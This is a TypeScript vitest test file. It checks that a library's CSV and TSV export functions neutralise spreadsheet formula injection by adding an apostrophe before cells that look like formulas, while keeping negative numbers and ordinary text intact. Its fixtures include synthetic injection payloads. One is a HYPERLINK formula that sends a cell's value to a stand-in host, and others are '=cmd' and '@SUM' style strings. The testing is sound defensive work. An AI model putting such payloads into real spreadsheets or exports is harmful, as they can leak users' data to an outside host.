import { describe, expect, it } from 'vitest';
import { recordsToCsv, tableToCsv, tableToTsv } from '../lib/csv';

// Synthetic values only. A cell that a spreadsheet would run as a formula must come out as text.
const evil = ['=HYPERLINK("https://x.example/?"&B2,"click")', '+1+1', '-2+3', '@SUM(A1)', '\t=1', '\r=1'];
const table = {
  columns: [
    { key: 'payer', label: 'Payer', type: 'string' as const },
    { key: 'delta', label: 'Delta', type: 'number' as const },
  ],
  rows: evil.map((s, i) => [s, -i - 1]),
};

describe('CSV / TSV formula injection', () => {
  it('prefixes formula-looking text with an apostrophe in CSV', () => {
    const lines = tableToCsv(table).split('\r\n').slice(1);
    for (const line of lines) expect(line).toMatch(/^"?'/);
  });

  it('keeps negative numbers numeric', () => {
    const lines = tableToCsv(table).split('\r\n').slice(1);
    expect(lines[0].endsWith(',-1')).toBe(true);
    expect(lines[5].endsWith(',-6')).toBe(true);
  });

  it('defuses copied TSV (paste into Sheets/Excel)', () => {
    const rows = tableToTsv(table).split('\n').slice(1);
    for (const row of rows) expect(row.split('\t')[0].startsWith("'")).toBe(true);
  });

  it('defuses chart "Download data" records and headers', () => {
    const csv = recordsToCsv([{ '=cmd': '@x', n: -3 }]);
    expect(csv).toBe("'=cmd,n\r\n'@x,-3");
  });

  it('leaves ordinary text alone', () => {
    expect(tableToCsv({ columns: table.columns, rows: [['CO-97', 1], ['Aetna, Inc.', 2]] })).toBe('Payer,Delta\r\nCO-97,1\r\n"Aetna, Inc.",2');
  });
});
